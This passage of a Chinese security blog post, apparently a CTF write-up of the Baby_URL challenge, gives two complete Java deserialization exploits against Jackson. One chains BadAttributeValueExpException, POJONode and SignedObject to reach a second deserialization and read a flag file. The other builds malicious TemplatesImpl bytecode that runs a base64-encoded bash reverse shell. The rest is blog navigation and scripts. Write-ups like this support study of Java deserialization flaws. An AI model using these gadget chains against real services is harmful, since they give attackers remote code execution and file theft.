class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">            jsonNode.removeMethod(writeReplace);</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">URLHelper</span> <span class="variable">urlHelper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLHelper</span>(<span class="string">&quot; file:///&quot;</span>);<span class="comment">//加空格绕过</span></span><br><span class="line">        <span class="type">URLVisiter</span> <span class="variable">urlVisiter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLVisiter</span>();</span><br><span class="line">        setFieldValue(urlHelper, <span class="string">&quot;visiter&quot;</span>, urlVisiter);</span><br><span class="line">        <span class="comment">//SignedObject初始化</span></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">keyPairGenerator</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="comment">//将urlHelper放进去</span></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(urlHelper, privateKey, signingEngine);</span><br><span class="line">		<span class="comment">//触发SignedObject#getObject</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp, jsonNodes);<span class="comment">//把 exp 对象里原本的 val 字段值 改成 jsonNodes</span></span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>完整流程为：</p>
+<p><code>ObjectInputStream.readObject()</code></p>
+<p>→ <code>BadAttributeValueExpException.readObject()</code></p>
+<p>→ 调 <code>val.toString()</code></p>
+<p>→ <code>POJONode.toString()</code>（Jackson 开始序列化内部对象）</p>
+<p>→ 反射调用 <code>SignedObject.getObject()</code></p>
+<p>→ <strong>二次反序列化</strong>出 <code>URLHelper</code></p>
+<p>→ <code>URLHelper</code> 的 <code>readObject</code> 里调用 <code>URLVisiter.visitUrl(url)</code></p>
+<p>→ 访问 <code>file:///flag_eddiemurphy</code>，读到内容，获取的结果写入/tmp/file文件</p>
+<p><img src="../images/image-20240803211139099.png" alt="img" /></p>
+<p><img src="../images/image-20240803211143135.png" alt="img" /></p>
+<h2 id="templatesimpl恶意字节码"><a class="markdownIt-Anchor" href="#templatesimpl恶意字节码"></a> TemplatesImpl恶意字节码</h2>
+<p>第二种方法，直接RCE</p>
+<p>这个方法甚至不需要它的URLHelper和URLVisiter，直接能反弹shell</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.eddiemurphy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">jsonNode</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> jsonNode.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">            jsonNode.removeMethod(writeReplace);</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplates();<span class="comment">//用javassist获取</span></span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>,  <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(val, <span class="string">&quot;val&quot;</span>, node);</span><br><span class="line"></span><br><span class="line">        System.out.println(serial(val));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//利用类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplates() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">template</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;MyTemplate&quot;</span>);</span><br><span class="line">        template.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">block</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,&lt;base64反弹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>;</span><br><span class="line">        template.makeClassInitializer().insertBefore(block);</span><br><span class="line">        <span class="keyword">return</span> template.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object val)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">dField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        dField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        dField.set(obj, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>就是普通的Jackson原生TemplatesImpl链</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JAVA%E5%AE%89%E5%85%A8/" rel="tag">JAVA安全</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">Jackson原生反序列化+二次反序列化</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/126839103p0master1200.jpg" data-sizes="auto" alt="记一次SnakeYaml+C3P0的HEX二次反序列化" class="lazyload">
+          
+        
+        <a href="/2025/10/05/%E8%AE%B0%E4%B8%80%E6%AC%A1SnakeYaml-C3P0%E7%9A%84HEX%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            记一次SnakeYaml+C3P0的HEX二次反序列化
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/1755142834147175514283467.jpg" data-sizes="auto" alt="测信道attackk" class="lazyload">
+        
+      
+      <a href="/2025/10/04/%E6%B5%8B%E4%BF%A1%E9%81%93attackk/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          测信道attackk
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#signedobject%E6%89%93%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">1.</span> <span class="toc-text"> SignedObject打二次反序列化绕过黑名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#templatesimpl%E6%81%B6%E6%84%8F%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text"> TemplatesImpl恶意字节码</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "记一次jackson原生链+二次反序列化",
+          url: "http://example.com/2025/10/05/%E8%AE%B0%E4%B8%80%E6%AC%A1jackson%E5%8E%9F%E7%94%9F%E9%93%BE-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
+          excerpt: "",
+          description: "",
+          stripContent: "[TOC] 来源于巅峰极客2023Baby_URL，不算很难，只不过我实在找不到适合的java题了 看依赖：就是给了一些spring依赖，众所周知，在 Spring Boot 中，通常自带jackson  jar包结构：  IndexController.java： 12345678910111213141516171819202122232425262728293031323334353637383940414243public class IndexController &amp;#123;    ",
+          date: "Sun Oct 05 2025 11:56:14 GMT+0800",
+          updated: "Wed Dec 17 2025 00:25:19 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
